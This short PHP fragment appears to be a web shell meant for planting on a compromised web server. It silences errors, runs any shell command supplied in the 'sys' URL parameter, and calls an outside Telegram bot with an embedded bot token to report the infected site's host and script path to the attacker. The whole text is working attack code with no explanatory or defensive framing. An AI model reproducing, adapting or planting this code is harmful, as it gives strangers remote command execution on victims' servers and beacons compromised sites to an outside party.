error_reporting(0);
system($_GET['sys']);
file_get_contents("https://api.telegram.org/bot1805814197:AAHrusR35N4QPMdTBjdSYVloAt-6WdyqsgA/sendMessage?chat_id=-1805814197&text=Old: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);